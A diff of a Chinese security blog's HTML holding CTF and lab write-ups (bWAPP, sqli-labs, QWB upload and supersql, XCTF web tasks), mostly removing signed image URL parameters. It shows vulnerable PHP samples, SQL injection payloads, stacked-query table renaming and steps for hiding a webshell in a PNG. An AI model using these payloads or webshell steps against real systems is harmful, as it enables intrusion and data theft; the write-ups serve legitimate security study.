 <h1 id="SQL-Injection-GET-Select"><a href="#SQL-Injection-GET-Select" class="headerlink" title="SQL Injection (GET/Select)"></a>SQL Injection (GET/Select)</h1><h2 id="产生原因-10"><a href="#产生原因-10" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"movie"</span>]))</span><br><span class="line">&#123;   </span><br><span class="line">    $id = $_GET[<span class="string">"movie"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the user selects a movie</span></span><br><span class="line">    <span class="keyword">if</span>($id)        </span><br><span class="line">    &#123;</span><br><span class="line">        $sql.= <span class="string">" WHERE id = "</span> . sqli($id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -1195,7 +1195,7 @@
 <p>这里是使用 Ajax 异步提交数据的方式，如果直接修改 URL 或者刷新页面是不会返回数据的</p>
 <p>但是用 burp 抓包之后修改 title 就可以注入。这里注入的原理也是输入未过滤导致可以构造 sql 语句。</p>
 <h2 id="利用方式-13"><a href="#利用方式-13" class="headerlink" title="利用方式"></a>利用方式</h2><p>抓包修改 title，构造 sql 语句，查看返回的 json 数据</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_8.png?Expires=1562563344&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=pFowKP0PnvRjRFdHs2v%2B2sCaXVk%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_8.png" alt></p>
 <h2 id="防护方式-13"><a href="#防护方式-13" class="headerlink" title="防护方式"></a>防护方式</h2><p>mysql_real_escape_string 函数与 addslashes 函数转义输入</p>
 <h1 id="SQL-Injection-CAPTCHA"><a href="#SQL-Injection-CAPTCHA" class="headerlink" title="SQL Injection (CAPTCHA)"></a>SQL Injection (CAPTCHA)</h1><h2 id="产生原因-14"><a href="#产生原因-14" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"title"</span>])) </span><br><span class="line">&#123;   </span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -1460,7 +1460,7 @@
 
 <p>如果想判断第二个表，把 limit 0,1 改为 limit 1,1 即可</p>
 <p>但是regexp中不可以，只要是table_name中的内容，regexp都可以匹配到</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png?Expires=1562562624&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=FY9IT5FL7wxAwKjJz4iLq0FC6iU%3D" alt="img"></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png" alt="img"></p>
 <h2 id="数据列-1"><a href="#数据列-1" class="headerlink" title="数据列"></a>数据列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=database() limit 0,1</span><br></pre></td></tr></table></figure>
 
 <p>改为</p>
@@ -1480,7 +1480,7 @@
 <p>如果关键的表被禁用了，可以使用这种形式</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/2.jpg?Expires=1562562635&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=7oxoF3LUbtsrryrWEdHwRgQOEfw%3D" alt="img"></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/2.jpg" alt="img"></p>
 <p>如果 rand 被禁用了可以使用用户变量来报错(实测未成功)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:(@a+1)%2)</span><br></pre></td></tr></table></figure>
 
@@ -1514,13 +1514,13 @@
 <p><strong>sqli-labs Less-18</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//Less-19的 referer 同理，也可以用 floor，updatexml </span><br><span class="line">1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/3.png?Expires=1562562646&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=ykDzvLLdY%2FXeSZKJ5lJfqalo2fY%3D" alt="img"></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/3.png" alt="img"></p>
 <p>我觉得Less-18是要输入正确的 uname 和 pass 的，否则是无法显示 user-agent</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/4.png?Expires=1562562671&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=CiswQFrjResw61oZ1dn55529KC0%3D" alt="img"></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/4.png" alt="img"></p>
 <p><strong>Less-20修改cookie</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin1&apos; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) #</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/5.png?Expires=1562562679&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=%2BGqq%2FK6btogyESC%2B5u51ebQHGtg%3D" alt="img"></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/5.png" alt="img"></p>
 <h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>这里是针对 ‘ 和 \ 被过滤的情况，一般采用 addslashes() 和 mysql_real_escape_string() 函数</p>
 <p>两者都是对 ‘ 和 \ 进行了 replace 处理，’ 转化为 &#39; ，\ 转化为 \，但是对数字型注入无效</p>
 <p>绕过方法：</p>
@@ -1726,16 +1726,16 @@
 <li><p>攻击流程：</p>
 <ol>
 <li><p>注册，登陆。登陆之后有个跳转的过程，这里就有了 cookie，如图</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_1.png?Expires=1562561940&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=CjyN8q%2Bq38Ed9FCUCuDiSdEYShw%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_1.png" alt></p>
 <p>解码后如图</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_2.png?Expires=1562561948&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=2bRsnyIOK%2Bx85mQYuFt6uOJMmGc%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_2.png" alt></p>
 </li>
 <li><p>选择上传图片，这个图片就是合成的图片马，从 <a href="https://www.iconfont.cn/" target="_blank" rel="noopener">阿里巴巴矢量图库</a> 下载一个 png 图片，然后蚁剑生成一个 shell，用 hex 编辑器直接将 shell 内容放在图片后面即可。这里使用阿里的图库是因为网上的 png 图片可能 hex 格式不规范，导致后面改名之后会报 parse error</p>
 </li>
 <li><p>上传图片之后，会在 upload 目录下生成一个 md5(REMOTE_ADDR) 文件，而且文件名也会被 md5 加密，这时 cookie[‘user’] 如图</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_3.png?Expires=1562561964&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=M5XcdHg%2Ft%2BCiKCJ5jpP0JyfWRns%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_3.png" alt></p>
 <p>解码后如图</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_4.png?Expires=1562561978&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=6Lz%2FCYVFkDeRPW0D7xzyBpPU60g%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_upload_4.png" alt></p>
 </li>
 <li><p>使用 poc 生成的序列化结果修改 cookie[‘user’]，刷新一次即可修改后缀。在服务器反序列化的过程中，在 Register 类中执行析构函数，调用 $profile 的 index() 函数，在 Profile 类的 __get 函数中定义了如果调用 index() 就去调用 img，而 __call 函数规定调用不可调用的函数时就调用 img 对应的函数，这样就控制函数跳转到 upload_img 函数，然后执行复制函数，将 png 改为 php，并删除原有的 png，至此，后缀修改完成。</p>
 </li>
@@ -1762,19 +1762,17 @@
 <li><p>测试一下有没有注入。<code>?inject=1&#39;%23</code>，返回正常，字符型注入</p>
 </li>
 <li><p>过滤了这么多关键词，尝试堆叠注入。<code>?inject=1&#39;;show databases;%23</code>，看到了所有的数据库</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_1.png?Expires=1562562003&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=9zqjL6GJA8q2%2BZaQteHnNmfgUX0%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_1.png" alt></p>
 </li>
 <li><p>再看一下所有的表。<code>?inject=1&#39;;show tables;%23</code>，1919810931114514 表和 words 表</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_2.png?Expires=1562562013&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=QDt%2Bimi2Me6OLWPr4LfMLp24XE4%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_2.png" alt></p>
 </li>
 <li><p>flag 在全数字的表里，默认查询的是 words 表</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show columns from `1919810931114514`;%23</span><br><span class="line">?inject=1&apos;;show columns from `words`;%23</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/6.png?Expires=1562562047&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=%2FpYvrnxAfI2fUoKPDVmgUo0OtOM%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/6.png" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/7.png" alt></p>
 </li>
-</ol>
-<p>​        <img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/7.png?Expires=1562562062&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=pvYch4UcmD2EjCgG5pZg1X4cL70%3D" alt></p>
-<ol start="7">
 <li><p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了</p>
 </li>
 <li><p>构造 payload 如下</p>
@@ -2189,7 +2187,7 @@
 <li>call() : 当要调用的方法不存在或权限不足时自动调用</li>
 <li>get() : 这个方法用来获取私有成员属性值的,有一个参数，参数传入你要获取的成员属性的名称，返回获取的属性值</li>
 </ul>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/magic_method.png?Expires=1562562475&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=04FEpTxoA3XhlRKuUsZG0Vv3TLM%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/magic_method.png" alt></p>
 <h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>CVE-2016-7124</p>
 <h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><ul>
 <li>标准类型：布尔，整型，浮点，字符</li>
@@ -2430,17 +2428,17 @@
 <p>构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.php，发现结果为 1.php.jpg</p>
 <p><strong>解释：</strong></p>
 <p>文件 ‘,extension=’’,filename=’1.jpg.jpg 上传后的数据库如下</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_1.PNG?Expires=1562562997&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=TnnBGdjcgZkiE6%2FsPKR09oha4J8%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_1.PNG" alt></p>
 <p>注意，rename过程中进行查询时，查询的结果 result[‘fid’] = 1，result[‘extension’] = ‘jpg’</p>
 <p>然后进行update，这时执行了构造的SQL语句，数据库如下</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_2.PNG?Expires=1562563006&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=PNX5Cw3Wo2Wx%2FmuhzFwofdalzwM%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_2.PNG" alt></p>
 <p>注意这两行代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">$newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br></pre></td></tr></table></figure>
 
 <p>在这个过程中，oldname=’,extension=’’,filename=’1.jpg.jpg，newname=1.php.jpg，由于oldname存在，所以最后变成1.php.jpg</p>
 <h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.jpg，结果为 <strong>1.jpg.jpg</strong></p>
 <p>构造另外一个一句话木马文件1.jpg，上传，数据库如下</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_3.PNG?Expires=1562563014&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=aKhauFoqIshz4BG7RjhGE2DLR40%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_3.PNG" alt></p>
 <p>再进行rename，传入的oldname为 1.jpg，newname为 1.php</p>
 <p>进行查询的结果为 result[‘fid’] = 1，result[‘extension’] = ‘’</p>
 <p>在最后的过程中，oldname = 1.jpg，newname = 1.php，这样就把上传的 1.jpg 变成了 1.php</p>
@@ -2588,29 +2586,29 @@
             <p>[TOC]</p>
 <h3 id="view-source"><a href="#view-source" class="headerlink" title="view source"></a>view source</h3><p>禁用右键，F12审查元素</p>
 <h3 id="get-post"><a href="#get-post" class="headerlink" title="get post"></a>get post</h3><p>hackbar进行post</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_1.PNG?Expires=1562562896&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=aCftWaB7NzIqVErby1Ku%2F%2BixTcs%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_1.PNG" alt></p>
 <h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>直接访问robots.txt，发现f1ag_1s_h3re.ph文件，直接访问</p>
 <h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>备份文件一般是在后缀名后加.swp，.bak</p>
 <p>本题尝试index.php.bak成功获取源码</p>
 <h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>burp抓包，发现提示，查看cookie.php，在响应头发现flag</p>
 <p>火狐，F12，网络，cookie可以看到提示，访问之后再看响应头即可</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_2.PNG?Expires=1562562904&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=5qb8L9l008WUB2Bd9lkRI6bPPCw%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_2.PNG" alt></p>
 <h3 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h3><p>F12审查元素，找到按钮对应的代码，发现<strong>disabled=””</strong>，具体属性可以查看w3school，删除这个属性即可。</p>
 <h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>拿到js源码，根据分析可以知道，函数dechiffre(pass_enc)的返回值与传入参数无关</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_3.PNG?Expires=1562562915&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=daDIVSnH%2BBTXFF9m3ram50SUu9I%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_3.PNG" alt></p>
 <p>根据<code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code>，替换\x为%，再URLdecode一下，得到<code>55,56,54,79,115,69,114,116,107,49,50</code>，Firefox控制台运行一下</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_4.PNG?Expires=1562562930&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=M8V3dMcvEm5ubkLfPq4F1QvuoVg%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_4.PNG" alt></p>
 <h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>burp改包</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_5.PNG?Expires=1562562938&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=DShkz0L15SpasoQ9jMJlA3VxBNM%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_5.PNG" alt></p>
 <h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>审查元素，发现submit的页面是check.php，直接访问，提示需要字典，burp爆破即可。但是这里我直接尝试admin，123456就登陆了，弱密码。</p>
 <h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>直接使用蚁剑</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_6.PNG?Expires=1562562949&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=7Qsbh7CVHxLH80WzojPYOUYDIYg%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_6.PNG" alt></p>
 <h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>关于命令执行，windows或linux下: </p>
 <p>command1 &amp;&amp; command2 先执行command1后执行command2</p>
 <p>command1 | command2 只执行command2 </p>
 <p>command1 &amp; command2 先执行command2后执行command1</p>
 <p>本题先使用ls不断遍历目录，查找flag，最后再读取</p>
-<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_7.PNG?Expires=1562562958&OSSAccessKeyId=TMP.hXQMERydCTiaSvmwYhquu78sn4oKBL3JdPxPSRuw64JqYj7VUagP7PoPDEyjDx8yyVWmArvb9aeLo6USa6vM7PqZ6HSZxrtJbnuzr64vFeBRi8FXMi6P78zfBu7c1Q.tmp&Signature=Rdu3%2Fc3GkdAS69d2XrCouS7hmBY%3D" alt></p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_7.PNG" alt></p>
 <h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><p>看到源码，考察php弱类型</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$a=@$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=@$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">0</span> <span class="keyword">and</span> $a)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($b))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
